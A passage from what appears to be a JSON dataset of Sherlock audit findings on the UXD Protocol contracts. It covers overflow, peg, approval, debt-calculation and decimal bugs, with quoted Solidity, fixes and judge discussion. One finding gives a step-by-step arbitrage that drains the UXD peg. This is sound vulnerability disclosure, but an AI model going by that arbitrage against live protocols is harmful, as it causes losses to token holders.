escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the `FullMath` library, which is used in the `MathLib library` in order to format an 18-decimal number to a FixedPoint 96.Q96 number. The original library was designed to handle intermediate overflows, but due to the fact that it was ported to solidity version `0.8.9`, which is `>0.8`, this operation would revert as the intermediate calculations would overflow, meaning that it can't handle those multiplication and division where an intermediate value overflows the 256 bits. The fix is to mark the full body in an unchecked block, in order to leverage the fact that the original version was designed in order to allow the intermediate overflow. A modified version of the original `Fullmath` library that uses unchecked blocks to handle the intended overflow, can be found in the 0.8 branch of the [Uniswap v3-core repo](https://github.com/Uniswap/v3-core/blob/0.8/contracts/libraries/FullMath.sol). This bug was found by DecorativePineapple and is considered a medium issue. The escalations have been accepted and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/273",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "DecorativePineapple"
      ]
    },
    {
      "id": "6267",
      "title": "M-9: Price disparities between spot and perpetual pricing can heavily destabilize UXD",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/305 \n\n## Found by \n0x52\n\n## Summary\n\nWhen minting UXD using PerpDepository.sol the amount of UXD minted corresponds to the amount of vUSD gained from selling the deposited ETH. This is problematic given that Perp Protocol is a derivative rather than a spot market, which means that price differences cannot be directly arbitraged with spot markets. The result is that derivative markets frequently trade at a price higher or lower than the spot price. The result of this is that UXD is actually pegged to vUSD rather than USD. This key difference can cause huge strain on a USD peg and likely depegging. \n\n## Vulnerability Detail\n\n    function deposit(\n        address asset,\n        uint256 amount\n    ) external onlyController returns (uint256) {\n        if (asset == assetToken) {\n            _depositAsset(amount);\n            (, uint256 quoteAmount) = _openShort(amount);\n            return quoteAmount; // @audit this mint UXD equivalent to the amount of vUSD gained\n        } else if (asset == quoteToken) {\n            return _processQuoteMint(amount);\n        } else {\n            revert UnsupportedAsset(asset);\n        }\n    }\n\nPerpDepository#deposit shorts the deposit amount and returns the amount of vUSD resulting from the swap, which effectively pegs it to vUSD rather than USD. When the perpetual is trading at a premium arbitrage will begin happening between the spot and perpetual asset and the profit will be taken at the expense of the UXD peg.\n\nExample:\nImagine markets are heavily trending with a spot price of $1500 and a perpetual price of $1530. A user can now buy 1 ETH for $1500 and deposit it to mint 1530 UXD. They can then swap the UXD for 1530 USDC (or other stablecoin) for a profit of $30. The user can continue to do this until either the perpetual price is arbitraged down to $1500 or the price of UXD is $0.98.\n\n## Impact\n\nUXD is pegged to vUSD rather than USD which can cause instability and loss of peg\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L240-L253\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend integrating with a chainlink oracle and using its price to determine the true spot price of ETH. When a user mints make sure that the amount minted is never greater than the spot price of ETH which will prevent the negative pressure on the peg:\n\n    function deposit(\n        address asset,\n        uint256 amount\n    ) external onlyController returns (uint256) {\n        if (asset == assetToken) {\n            _depositAsset(amount);\n            (, uint256 quoteAmount) = _openShort(amount);\n\n    +       spotPrice = assetOracle.getPrice();\n    +       assetSpotValue = amount.mulwad(spotPrice);\n\n    -       return quoteAmount;\n    +       return quoteAmount <= assetSpotValue ? quoteAmount: assetSpotValue;\n        } else if (asset == quoteToken) {\n            return _processQuoteMint(amount);\n        } else {\n            revert UnsupportedAsset(asset);\n        }\n    }\n\n## Discussion\n\n**WarTech9**\n\nIt's a design decision to use the PERP price to determine mint/redeem amounts.\nWe can add oracle pricing in the future to be more robust, but that is not a priority at this moment.\n\n**acamill**\n\nThis is a known issue on Solana implementation too.\nOver the course of the year this offset due to the spread between spot and perp prices always went back to 0.\nBut this is something that we have in mind for later\n\n**hrishibhat**\n\nThis is a valid issue in case of certain market conditions or manipulations for the vUSD to trade away from the peg. \nConsidering this issue as a valid medium.",
      "summary": "\nThis bug report is about the price disparities between spot and perpetual pricing, which can heavily destabilize UXD. When minting UXD using PerpDepository.sol, the amount of UXD minted corresponds to the amount of vUSD gained from selling the deposited ETH. This is problematic given that Perp Protocol is a derivative rather than a spot market, meaning that price differences cannot be directly arbitraged with spot markets. This can cause huge strain on a USD peg and likely depegging of UXD. \n\nAn example of this is if the spot price of ETH is $1500 and the perpetual price is $1530. A user can buy 1 ETH for $1500 and deposit it to mint 1530 UXD. They can then swap the UXD for 1530 USDC (or other stablecoin) for a profit of $30. The user can continue to do this until either the perpetual price is arbitraged down to $1500 or the price of UXD is $0.98.\n\nThe bug report recommends integrating with a chainlink oracle and using its price to determine the true spot price of ETH. This would prevent the negative pressure on the peg by making sure that the amount minted is never greater than the spot price of ETH.\n\nThe bug report also discusses the issue of using the PERP price to determine mint/redeem amounts and how this issue is also present in the Solana implementation. It is acknowledged that this issue is valid in certain market conditions or manipulations for the vUSD to trade away from the peg.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/305",
      "tags": [
        "Pegged"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6266",
      "title": "M-8: Redeeming all UXD tokens is not possible if some have been minted via Perp quote minting",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/338 \n\n## Found by \nberndartmueller\n\n## Summary\n\nIf some UXD tokens have been minted via Perp quote minting (i.e. `USDC` - due to negative PnL), rather than asset minting (i.e. `WETH`), redeeming all UXD tokens is not possible anymore due to not accounting for quote minting in the `netAssetDeposits` variable.\n\n## Vulnerability Detail\n\nThe Perp integration allows users to deposit assets and return the redeemable (UXD) amount that can be minted. Assets can be deposited in two ways: either `assetToken` or `quoteToken`. `quoteToken` (i.e., `USDC`) can only be deposited if there's a negative PnL > `amount` to pay off the negative PnL.\n\nDepositing `assetToken` (i.e., `WETH`) increases the internal accounting variable `netAssetDeposits`, which is the amount of `assetToken` deposited minus the amount of `assetToken` withdrawn. Withdrawing `assetToken` decreases `netAssetDeposits` by the amount withdrawn.\n\nHowever, depositing `quoteToken` (if available) does not increase the `netAssetDeposits` variable. This leads to more `UXD` tokens being minted than `assetToken` deposited.\n\nThus, redeeming all `UXD` tokens is not possible anymore if some `UXD` tokens have been minted via quote minting. Users who are left last with redeeming their UXD tokens cannot do so.\n\n**Consider the following example:**\n\n- `assetToken` = `WETH`\n- `quoteToken` = `USDC`\n- `1 ether` of `WETH` = `1_000e6` `USDC` = `1_000e18` UXD\n- Negative PnL occurs during deposits because of market volatility\n\n| Time | Action                                                                 | `netAssetDeposits` | UXD supply  |\n| ---- | ---------------------------------------------------------------------- | ------------------ | ----------- |\n| T0   | Alice deposits `10 ether` of `assetToken`                              | `10 ether`         | `10_000e18` |\n| T1   | Bob deposits `10 ether` of `assetToken`                                | `20 ether`         | `20_000e18` |\n| T2   | Caroline deposits `1_000e6` of `quoteToken` (due to negative PnL)      | `20 ether`         | `21_000e18` |\n| T10  | Caroline redeems `1_000e18 UXD` via `1 ether` `assetToken`             | `19 ether`         | `20_000e18` |\n| T11  | Bob redeems `10_000e18 UXD` via `10 ether` `assetToken`                | `9 ether`          | `10_000e18` |\n| T12  | Alice redeems `10_000e18 UXD` via `10 ether` `assetToken` -> **fails** | `9 ether`          | `10_000e18` |\n\nAlice is not able to redeem her balance of `10_000e18 UXD` because `netAssetDeposits = 9 ether` is insufficient to redeem `10_000e18 UXD = 10 ether`.\n\n## Impact\n\nUXD tokens can not be fully redeemed via the Perp depository if some have been minted via quote minting.\n\n## Code Snippet\n\n[integrations/perp/PerpDepository.sol#L284](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L284)\n\nAsset token deposits increase the internal accounting variable `netAssetDeposits` by the amount deposited.\n\n```solidity\n/// @notice Deposits collateral to back the delta-neutral position\n/// @dev Only called by the controller\n/// @param amount The amount to deposit\nfunction _depositAsset(uint256 amount) private {\n    netAssetDeposits += amount;\n\n    IERC20(assetToken).approve(address(vault), amount);\n    vault.deposit(assetToken, amount);\n}\n```\n\n[integrations/perp/PerpDepository.sol#L298](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L298)\n\nWithdrawing asset tokens (i.e. `WETH`) decreases the internal accounting variable `netAssetDeposits` by the amount withdrawn and thus limits the amount of redeemable UXD tokens to `netAssetDeposits`.\n\n```solidity\n/// @notice Withdraws collateral to used in the delta-neutral position.\n/// @dev This should only happen when redeeming UXD for collateral.\n/// Only called by the controller.\n/// @param amount The amount to deposit\nfunction _withdrawAsset(uint256 amount, address to) private {\n    if (amount > netAssetDeposits) {\n        revert InsufficientAssetDeposits(netAssetDeposits, amount);\n    }\n    netAssetDeposits -= amount;\n\n    vault.withdraw(address(assetToken), amount);\n    IERC20(assetToken).transfer(to, amount);\n}\n```\n\n[integrations/perp/PerpDepository.redeem](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L264)\n\nRedeeming via quote tokens is disabled. Only redeeming via `assetToken` is possible. Thus, leaving no other option than to redeem via `assetToken`.\n\n```solidity\nfunction redeem(\n        address asset,\n    uint256 amount\n) external onlyController returns (uint256) {\n    if (asset == assetToken) {\n        (uint256 base, ) = _openLong(amount);\n        _withdrawAsset(base, address(controller));\n        return base;\n    } else if (asset == quoteToken) {\n        revert QuoteRedeemDisabled(msg.sender);\n        // return _processQuoteRedeem(amount);\n    } else {\n        revert UnsupportedAsset(asset);\n    }\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider changing the internal accounting of `netAssetDeposits` to include `quoteToken` deposits.\n\n\n## Discussion\n\n**berndartmueller**\n\nEscalate for 25 USDC\n\nI think this issue is wrongly duped. The duped issues mention a similar issue in the context of the **rebalancing** functions. This issue demonstrated here is about **quote minting** in the case of a negative PnL.\n\nI think it's justified to leave this issue on its own without the duplicate issues. The duped issues should be left as a separate issue (Please note that #434 does not mention the real impact of not being able to redeem fully).\n\n(https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97 has also been considered a separate issue)\n\n**sherlock-admin**\n\n > Escalate for 25 USDC\n> \n> I think this issue is wrongly duped. The duped issues mention a similar issue in the context of the **rebalancing** functions. This issue demonstrated here is about **quote minting** in the case of a negative PnL.\n> \n> I think it's justified to leave this issue on its own without the duplicate issues. The duped issues should be left as a separate issue (Please note that #434 does not mention the real impact of not being able to redeem fully).\n> \n> (https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97 has also been considered a separate issue)\n\nYou've created a valid escalation for 25 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nAgreed that the issues is different from its dupes. \nSeparating from the rest of the issues #178, #262, #141 as they are considered as low together, since not updating `netAssetDeposits` on rebalance does not cause any real issues. \nAlso, issue #434 touches upon the issue partially, but does not fully describe the complete issue & its impact. Hence considering it a low. \n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Agreed that the issues is different from its dupes. \n> Separating from the rest of the issues #178, #262, #141 as they are considered as low together, since not updating `netAssetDeposits` on rebalance does not cause any real issues. \n> Also, issue #434 touches upon the issue partially, but does not fully describe the complete issue & its impact. Hence considering it a low. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the UXD tokens, which are redeemable tokens that can be minted via Perp quote minting. If some UXD tokens have been minted via Perp quote minting (i.e. USDC - due to negative PnL), rather than asset minting (i.e. WETH), redeeming all UXD tokens is not possible anymore due to not accounting for quote minting in the netAssetDeposits variable. \n\nThe Perp integration allows users to deposit assets and return the redeemable (UXD) amount that can be minted. Assets can be deposited in two ways: either assetToken or quoteToken. QuoteToken (i.e., USDC) can only be deposited if there's a negative PnL > amount to pay off the negative PnL. Depositing assetToken (i.e., WETH) increases the internal accounting variable netAssetDeposits, which is the amount of assetToken deposited minus the amount of assetToken withdrawn. Withdrawing assetToken decreases netAssetDeposits by the amount withdrawn. However, depositing quoteToken (if available) does not increase the netAssetDeposits variable. This leads to more UXD tokens being minted than assetToken deposited. Thus, redeeming all UXD tokens is not possible anymore if some UXD tokens have been minted via quote minting.\n\nThe impact of this bug is that UXD tokens can not be fully redeemed via the Perp depository if some have been minted via quote minting. The code snippet from the bug report shows how asset token deposits increase the internal accounting variable netAssetDeposits by the amount deposited, and how withdrawing asset tokens (i.e. WETH) decreases the internal accounting variable netAssetDeposits by the amount withdrawn, thus limiting the amount of redeemable UXD tokens to netAssetDeposits. Redeeming via quote tokens is disabled, leaving no other option than to redeem via assetToken.\n\nThe recommendation for this bug is to consider changing the internal accounting of netAssetDeposits to include quoteToken deposits. This bug was found by berndartmueller and was discussed with sherlock-admin and hrishibhat, who agreed that the issue is different from its dupes and accepted the escalation to remove it from consideration. Contestants' payouts and scores will be updated according",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/338",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "berndartmueller"
      ]
    },
    {
      "id": "6265",
      "title": "M-7: Rebalancing a negative Perp PnL via a Uniswap V3 token swap is broken due to the lack of token spending allowance",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/339 \n\n## Found by \n0x52, Jeiwan, berndartmueller, koxuan, jprod15, Bahurum, cccz, CRYP70, rvierdiiev, GimelSec\n\n## Summary\n\nThe `ISwapper spotSwapper` (i.e., `Uniswapper`) helper contract, used by the `PerpDepository._rebalanceNegativePnlWithSwap` function to perform the actual Uniswap V3 token swap, is missing the required `assetToken` spending allowance due to a lack of calling the `assetToken.approve` function.\n\n## Vulnerability Detail\n\nRebalancing a negative Perp PnL with the `PerpDepository.rebalance` function calls the `_rebalanceNegativePnlWithSwap` function, which performs a Uniswap swap. However, the required `assetToken` spending allowance for the `ISwapper spotSwapper` (i.e. `Uniswapper`) helper contract is missing. This leads to a revert due to insufficient allowance.\n\n## Impact\n\nRebalancing a negative Perp PnL via a Uniswap swap is missing the token approval and leads to a revert.\n\n## Code Snippet\n\n[integrations/perp/PerpDepository.sol#L507](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L507)\n\n```solidity\nfunction _rebalanceNegativePnlWithSwap(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    address account\n) private returns (uint256, uint256) {\n    uint256 normalizedAmount = amount.fromDecimalToDecimal(\n        ERC20(quoteToken).decimals(),\n        18\n    );\n    _checkNegativePnl(normalizedAmount);\n    bool isShort = false;\n    bool amountIsInput = true;\n    (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n        normalizedAmount,\n        isShort,\n        amountIsInput,\n        sqrtPriceLimitX96\n    );\n    vault.withdraw(assetToken, baseAmount);\n    SwapParams memory params = SwapParams({\n        tokenIn: assetToken,\n        tokenOut: quoteToken,\n        amountIn: baseAmount,\n        amountOutMinimum: amountOutMinimum,\n        sqrtPriceLimitX96: sqrtPriceLimitX96,\n        poolFee: swapPoolFee\n    });\n    uint256 quoteAmountOut = spotSwapper.swapExactInput(params); // @audit-info missing token approval\n\n    // [...]\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding the appropriate token approval before the swap in L507.",
      "summary": "\nThis bug report is about a vulnerability in the `ISwapper spotSwapper` (i.e., `Uniswapper`) helper contract, used by the `PerpDepository._rebalanceNegativePnlWithSwap` function to perform the actual Uniswap V3 token swap. The required `assetToken` spending allowance for the `ISwapper spotSwapper` is missing, which leads to a revert due to insufficient allowance. This issue was found by 0x52, Jeiwan, berndartmueller, koxuan, jprod15, Bahurum, cccz, CRYP70, rvierdiiev, and GimelSec, and was identified through manual review. \n\nThe impact of this issue is that rebalancing a negative Perp PnL via a Uniswap swap is missing the token approval and leads to a revert. The code snippet from line 507 of the PerpDepository.sol file is provided in the report. The recommendation is to consider adding the appropriate token approval before the swap in line 507.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/339",
      "tags": [
        "Allowance"
      ],
      "finders": [
        "jprod15",
        "0x52",
        "Bahurum",
        "cccz",
        "Jeiwan",
        "koxuan",
        "berndartmueller",
        "CRYP70",
        "rvierdiiev",
        "GimelSec"
      ]
    },
    {
      "id": "6264",
      "title": "M-6: Inaccurate Perp debt calculation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/346 \n\n## Found by \npeanuts, HollaDieWaldfee, hl\\_, berndartmueller\n\n## Summary\n\nThe anticipated Perp account debt value calculation via `PerpDepository.getDebtValue` is inaccurate and does not incorporate the (not yet settled) owed realized PnL `owedRealizedPnl`.\n\n## Vulnerability Detail\n\nThe `PerpDepository.getDebtValue` function calculates the account debt value by subtracting the pending funding payments and fees from the quote token balance and unrealized PnL. However, the owed realized PnL (`owedRealizedPnl`) is not considered in the calculation. The owed realized PnL is the realized PnL owed to the account but has **not yet been settled**.\n\nPerp provides the `Vault.getSettlementTokenValue()` function to calculate the settlement token value of an account and uses it to determine the accounts' debt (if < 0, [see docs](https://docs.perp.com/docs/contracts/Vault/#getsettlementtokenvalue)). For example, it is used to determine if an account is liquidable - see [Vault.isLiquidatable#L434](https://github.com/perpetual-protocol/perp-curie-contract/blob/27ea8e2c4be37d1dd58c1eed3b3cc269d398a091/contracts/Vault.sol#L434)\n\nPerps' specs define the value of an account as ([see here for reference](https://support.perp.com/hc/en-us/articles/5331515119001)):\n\n$$\n\\begin{aligned} accountValue &= \\underbrace{collateral + owedRealizedPnl + pendingFundingPayment + pendingFee}_{totalCollateralValue} + \\underbrace{\\sum_{market}{unrealizedPnl_{market}}}_{totalUnrealizedPnl} \\end{aligned}\n$$\n\n## Impact\n\nThe Perp account debt calculation is inaccurate and deviates from the calculation by the Perp protocol itself. Even though the `PerpDepository.getDebtValue` function is `external`, it could lead to issues when querying from another contract or off-chain to use as decision criteria or manifest as a serious issue when used in an upgraded version of the contract.\n\n## Code Snippet\n\n[integrations/perp/PerpDepository.sol#L773](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L773)\n\n```solidity\n/// @notice Get the quote token balance of this user\n/// @dev THe total debt is computed as:\n///     quote token balance + unrealized PnL - Pending fee - pending funding payments\n/// @param account The account to return the debt for\n/// @return debt The account debt, or zero if no debt.\nfunction getDebtValue(address account) external view returns (uint256) {\n    IAccountBalance perpAccountBalance = IAccountBalance(\n        clearingHouse.getAccountBalance()\n    );\n    IExchange perpExchange = IExchange(clearingHouse.getExchange());\n    int256 accountQuoteTokenBalance = vault.getBalance(account);\n    if (accountQuoteTokenBalance < 0) {\n        revert InvalidQuoteTokenBalance(accountQuoteTokenBalance);\n    }\n    int256 fundingPayment = perpExchange.getAllPendingFundingPayment(\n        account\n    );\n    uint256 quoteTokenBalance = uint256(accountQuoteTokenBalance)\n        .fromDecimalToDecimal(ERC20(quoteToken).decimals(), 18);\n    (\n        , // @audit-info `owedRealizedPnl` is omitted here and missing in the calculation below\n        int256 perpUnrealizedPnl,\n        uint256 perpPendingFee\n    ) = perpAccountBalance.getPnlAndPendingFee(account);\n    int256 debt = int256(quoteTokenBalance) +\n        perpUnrealizedPnl -\n        int256(perpPendingFee) -\n        fundingPayment;\n    return (debt > 0) ? 0 : _abs(debt);\n}\n```\n\n[Vault.\\_getSettlementTokenValue](https://github.com/perpetual-protocol/perp-curie-contract/blob/27ea8e2c4be37d1dd58c1eed3b3cc269d398a091/contracts/Vault.sol#L880-L884)\n\n`Vault._getSettlementTokenValue` is called internally by Perp's public `Vault.getSettlementTokenValue()` function.\n\n```solidity\nfunction _getSettlementTokenValue(address trader) internal view returns (int256 settlementTokenValueX10_18) {\n    (int256 settlementBalanceX10_18, int256 unrealizedPnlX10_18) =\n        _getSettlementTokenBalanceAndUnrealizedPnl(trader);\n    return settlementBalanceX10_18.add(unrealizedPnlX10_18);\n}\n```\n\n[Vault.\\_getSettlementTokenBalanceAndUnrealizedPnl](https://github.com/perpetual-protocol/perp-curie-contract/blob/27ea8e2c4be37d1dd58c1eed3b3cc269d398a091/contracts/Vault.sol#L852-L877)\n\n```solidity\n/// @notice Get the specified trader's settlement token balance, including pending fee, funding payment,\n///         owed realized PnL, but without unrealized PnL)\n/// @dev Note the difference between the return argument`settlementTokenBalanceX10_18` and\n///      the return value of `getSettlementTokenValue()`.\n///      The first one is settlement token balance with pending fee, funding payment, owed realized PnL;\n///      The second one is the first one plus unrealized PnL.\n/// @return settlementTokenBalanceX10_18 Settlement amount in 18 decimals\n/// @return unrealizedPnlX10_18 Unrealized PnL in 18 decimals\nfunction _getSettlementTokenBalanceAndUnrealizedPnl(address trader)\n    internal\n    view\n    returns (int256 settlementTokenBalanceX10_18, int256 unrealizedPnlX10_18)\n{\n    int256 fundingPaymentX10_18 = IExchange(_exchange).getAllPendingFundingPayment(trader);\n\n    int256 owedRealizedPnlX10_18;\n    uint256 pendingFeeX10_18;\n    (owedRealizedPnlX10_18, unrealizedPnlX10_18, pendingFeeX10_18) = IAccountBalance(_accountBalance)\n        .getPnlAndPendingFee(trader);\n\n    settlementTokenBalanceX10_18 = getBalance(trader).parseSettlementToken(_decimals).add(\n        pendingFeeX10_18.toInt256().sub(fundingPaymentX10_18).add(owedRealizedPnlX10_18) // @audit-info owed realized PnL is added here\n    );\n\n    return (settlementTokenBalanceX10_18, unrealizedPnlX10_18);\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using the `Vault.getSettlementTokenValue()` function to determine the accounts' debt ([see docs](https://docs.perp.com/docs/contracts/Vault/#getsettlementtokenvalue)).",
      "summary": "\nThis bug report is about an inaccurate calculation of Perp account debt value using the `PerpDepository.getDebtValue` function. The calculation does not incorporate the (not yet settled) owed realized PnL `owedRealizedPnl`. This calculation is used to determine if an account is liquidable. According to the Perp specs, the value of an account should include the collateral, owedRealizedPnl, pendingFundingPayment and pendingFee, as well as the sum of the unrealizedPnl for each market. \n\nThe bug was found by peanuts, HollaDieWaldfee, hl_ and berndartmueller. It was identified by manual review and the code snippet can be found in the integrations/perp/PerpDepository.sol#L773, Vault._getSettlementTokenValue and Vault._getSettlementTokenBalanceAndUnrealizedPnl files.\n\nThe impact of this bug is that the account debt calculation is inaccurate and deviates from the calculation by the Perp protocol itself. This could lead to issues when querying from another contract or off-chain to use as decision criteria or manifest as a serious issue when used in an upgraded version of the contract.\n\nThe recommendation is to consider using the `Vault.getSettlementTokenValue()` function to determine the accounts' debt ([see docs](https://docs.perp.com/docs/contracts/Vault/#getsettlementtokenvalue)).",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/346",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "berndartmueller",
        "HollaDieWaldfee",
        "hl\\_",
        "peanuts"
      ]
    },
    {
      "id": "6263",
      "title": "M-5: PerpDepository#_rebalanceNegativePnlWithSwap fails to approve vault for quote deposit",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/372 \n\n## Found by \nHonorLt, 0x52, yixxas, Bahurum, rvierdiiev, GimelSec\n\n## Summary\n\nThroughout the entirety of the contract it grants approval to the vault before depositing either quote or asset. In this case there is no approval which means that the deposit call will fail causing PerpDepository#_rebalanceNegativePnlWithSwap to always revert.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nPerpDepository#_rebalanceNegativePnlWithSwap won't function\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd the missing approve call:\n\n        } else if (shortFall < 0) {\n            // we got excess tokens in the spot swap. Send them to the account paying for rebalance\n            IERC20(quoteToken).transfer(\n                account,\n                _abs(shortFall)\n            );\n        }\n\n    +   IERC20(quoteToken).approve(address(vault), quoteAmount); \n        vault.deposit(quoteToken, quoteAmount);\n\n        emit Rebalanced(baseAmount, quoteAmount, shortFall);\n        return (baseAmount, quoteAmount);\n\n## Discussion\n\n**WarTech9**\n\nThis is a duplicate of #339 \n\n**0x00052**\n\nTwo separate issues here. #339 is pointing out it's not approved for the swapper. This one is pointing out it's not approved for the vault. It should be approved for both\n\n**WarTech9**\n\n@0x00052 good catch. You're right. This is a separate issue from #339",
      "summary": "\nThis bug report is about an issue with PerpDepository#_rebalanceNegativePnlWithSwap failing to approve vault for quote deposit. It was found by HonorLt, 0x52, yixxas, Bahurum, rvierdiiev, and GimelSec. The problem is that the contract grants approval to the vault before depositing either quote or asset, but in this case, there is no approval which means that the deposit call will fail causing PerpDepository#_rebalanceNegativePnlWithSwap to always revert. The impact of this issue is that PerpDepository#_rebalanceNegativePnlWithSwap won't function. The code snippet can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528. The tool used to find the issue was manual review. The recommended solution is to add the missing approve call. Lastly, it was pointed out that this is a separate issue from #339.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/372",
      "tags": [
        "Allowance"
      ],
      "finders": [
        "0x52",
        "Bahurum",
        "yixxas",
        "HonorLt",
        "rvierdiiev",
        "GimelSec"
      ]
    },
    {
      "id": "6262",
      "title": "M-4: Deposit and withdraw to the vault with the wrong decimals of amount in contract `PerpDepository`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/402 \n\n## Found by \nberndartmueller, yixxas, HollaDieWaldfee, Bahurum, rvierdiiev, duc, peanuts\n\n## Summary\nFunction `vault.deposit` and `vault.withdraw` of vault in contract `PerpDepository` need to be passed with the amount in raw decimal of tokens (is different from 18 in case using USDC, WBTC, ... as base and quote tokens). But some calls miss the conversion of decimals from 18 to token's decimal, and pass wrong decimals into them.\n## Vulnerability Detail\n* Function `vault.deposit` need to be passed the param amount in token's decimal (as same as `vault.withdraw`). You can see at function `_depositAsset` in contract PerpDepository.\n```solidity=\nfunction _depositAsset(uint256 amount) private {\n    netAssetDeposits += amount;\n    \n    IERC20(assetToken).approve(address(vault), amount);\n    vault.deposit(assetToken, amount);\n}\n```\n* But there are some calls of `vault.deposit` and `vault.withdraw` that passed the amount in the wrong decimal (18 decimal).\nLet's see function `_rebalanceNegativePnlWithSwap` in contract PerpDepository:\n```solidity=\nfunction _rebalanceNegativePnlWithSwap(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    address account\n) private returns (uint256, uint256) {\n    ...\n    (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n        normalizedAmount,\n        isShort,\n        amountIsInput,\n        sqrtPriceLimitX96\n    );\n    vault.withdraw(assetToken, baseAmount); \n    \n    ...\n    \n    vault.deposit(quoteToken, quoteAmount);\n\n    emit Rebalanced(baseAmount, quoteAmount, shortFall);\n    return (baseAmount, quoteAmount);\n}\n```\nBecause function `_placePerpOrder` returns in decimal 18 (confirmed with sponsor WarTech), this calls pass `baseAmount` and `quoteAmount` in decimal 18, inconsistent with the above call. It leads to vault using the wrong decimal when depositing and withdrawing tokens.\n* There is  another case that use `vault.withdraw` with the wrong decimal (same as this case) in function `_rebalanceNegativePnlLite`:\n```solidity=\n//function _rebalanceNegativePnlLite, contract PerpDepository\n...\n\n(uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n    normalizedAmount,\n    isShort,\n    amountIsInput,\n    sqrtPriceLimitX96\n);\nvault.withdraw(assetToken, baseAmount);\n\n...\n```\n## Impact\nBecause of calling `vault.deposit` and `vault.withdraw` with the wrong decimal of the param amount, the protocol can lose a lot of funds. And some functionalities of the protocol can be broken cause it can revert by not enough allowance when calling these functions.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L498\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L524\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L638\n## Tool used\n\nManual Review\n\n## Recommendation\nShould convert the param `amount` from token's decimal to decimal 18 before `vault.deposit` and `vault.withdraw`.\n\n## Discussion\n\n**WarTech9**\n\n~~`amount` is always in the unit of the token being deposited so no normalization required.~~\n\n**hrishibhat**\n\n@WarTech9 just confirming that your comment is applicable to all the duplicates  tagged here. Right?\n\n**WarTech9**\n\nAfter further review this issue is valid. `quoteAmount` should be converted to `quoteDecimals` before `vault.deposit()` in 